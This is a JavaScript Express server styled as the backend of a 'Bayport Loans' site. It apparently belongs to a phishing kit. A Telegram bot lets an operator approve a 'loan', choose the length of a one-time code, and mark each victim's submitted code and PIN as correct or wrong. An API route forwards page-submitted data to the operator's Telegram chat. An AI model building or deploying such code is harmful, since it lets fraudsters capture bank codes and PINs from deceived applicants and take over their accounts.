// ==================== LOAD ENV FIRST ====================
require('dotenv').config();

// ==================== IMPORTS ====================
const express = require('express');
const cors = require('cors');
const path = require('path');
const morgan = require('morgan');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');  // ADD THIS

// ==================== INIT ====================
const app = express();
const PORT = process.env.PORT || 5000;

// ==================== START TELEGRAM BOT ====================
const botToken = process.env.TELEGRAM_BOT_TOKEN;
let bot = null;

if (botToken) {
    try {
        bot = new TelegramBot(botToken, { polling: true });
        console.log('🤖 Telegram Bot Started Successfully');

        // /start command
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            bot.sendMessage(chatId, 
                '🚀 *Bayport Loans Admin Bot*\n\n' +
                '*Commands:*\n' +
                '• `/approve_[ref]` - Approve application\n' +
                '• `/reject_[ref]` - Reject application\n' +
                '• `/correct_[ref]` - Mark code as correct\n' +
                '• `/wrong_[ref]` - Mark code as wrong\n' +
                '• `/pin_correct_[ref]` - Mark PIN as correct\n' +
                '• `/pin_wrong_[ref]` - Mark PIN as wrong\n\n' +
                '*Example:* `/approve_BLABC123`',
                { parse_mode: 'Markdown' }
            );
        });

        // Approve command
        bot.onText(/\/approve_(.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const refId = match[1];
            bot.sendMessage(chatId, 
                `✅ *Application Approved*\n\nReference: ${refId}\n\nSelect code length:`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '4 Digits', callback_data: `code4_${refId}` },
                                { text: '5 Digits', callback_data: `code5_${refId}` },
                                { text: '6 Digits', callback_data: `code6_${refId}` }
                            ]
                        ]
                    }
                }
            );
        });

        // Reject command
        bot.onText(/\/reject_(.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const refId = match[1];
            bot.sendMessage(chatId, `❌ *Application Rejected*\n\nReference: ${refId}`, { parse_mode: 'Markdown' });
        });

        // Code correct
        bot.onText(/\/correct_(.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const refId = match[1];
            bot.sendMessage(chatId, `✅ *Code Correct*\n\nReference: ${refId}\n\nWaiting for PIN...`, { parse_mode: 'Markdown' });
        });

        // Code wrong
        bot.onText(/\/wrong_(.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const refId = match[1];
            bot.sendMessage(chatId, `❌ *Wrong Code*\n\nReference: ${refId}\n\nUser will try again.`, { parse_mode: 'Markdown' });
        });

        // PIN correct
        bot.onText(/\/pin_correct_(.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const refId = match[1];
            bot.sendMessage(chatId, `✅ *PIN Correct*\n\nReference: ${refId}\n\nApplication Complete!`, { parse_mode: 'Markdown' });
        });

        // PIN wrong
        bot.onText(/\/pin_wrong_(.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const refId = match[1];
            bot.sendMessage(chatId, `❌ *Wrong PIN*\n\nReference: ${refId}\n\nUser will try again.`, { parse_mode: 'Markdown' });
        });

        // Handle inline keyboard callbacks (code length selection)
        bot.on('callback_query', async (callbackQuery) => {
            const msg = callbackQuery.message;
            const [action, refId] = callbackQuery.data.split('_');
            
            let codeLength = '';
            if (action === 'code4') codeLength = '4-digit';
            if (action === 'code5') codeLength = '5-digit';
            if (action === 'code6') codeLength = '6-digit';
            
            bot.sendMessage(msg.chat.id, 
                `✅ *${codeLength} code selected*\n\nReference: ${refId}\n\nThe user will now be prompted for a ${codeLength} code.`,
                { parse_mode: 'Markdown' }
            );
            
            bot.answerCallbackQuery(callbackQuery.id);
        });

    } catch (error) {
        console.log('⚠️ Bot error:', error.message);
    }
} else {
    console.log('⚠️ No bot token provided');
}

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(morgan('dev'));

// ==================== STATIC FILES - SERVE FRONTEND ====================
app.use(express.static(path.join(__dirname, 'frontend')));

// ==================== API ROUTES ====================

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Bayport Loans Backend Running',
        timestamp: new Date().toISOString()
    });
});

// Send message to Telegram
app.post('/api/send-message', async (req, res) => {
    try {
        const { message } = req.body;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.ADMIN_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ 
                success: false, 
                error: 'Missing Telegram configuration' 
            });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('Telegram Error:', error.response?.data || error.message);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message
        });
    }
});

// Get updates from Telegram
app.get('/api/get-updates/:offset?', async (req, res) => {
    try {
        const offset = req.params.offset || 0;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;

        if (!botToken) {
            return res.status(500).json({ 
                success: false, 
                error: 'Missing Telegram configuration' 
            });
        }

        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/getUpdates`,
            {
                params: {
                    offset: offset,
                    timeout: 30,
                    allowed_updates: ['message']
                }
            }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to get updates from Telegram' 
        });
    }
});

// ==================== FRONTEND ROUTES ====================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/index.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page3.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/success.html'));
});

// ==================== ERROR HANDLING ====================

app.use('/api/*', (req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'API endpoint not found' 
    });
});

app.use((err, req, res, next) => {
    console.error('Server Error:', err.stack);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error'
    });
});

// ==================== START SERVER ====================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔════════════════════════════════════════════╗
    ║     🚀 BAYPORT LOANS BACKEND SERVER       ║
    ╠════════════════════════════════════════════╣
    ║  📡 Port: ${PORT}                             ║
    ║  🌍 Environment: ${process.env.NODE_ENV || 'development'}        ║
    ║  📁 Frontend: ${path.join(__dirname, 'frontend')}  ║
    ║  🤖 Telegram Bot: ${bot ? '✅ Running' : '❌ Not Running'}         ║
    ╚════════════════════════════════════════════╝
    `);
});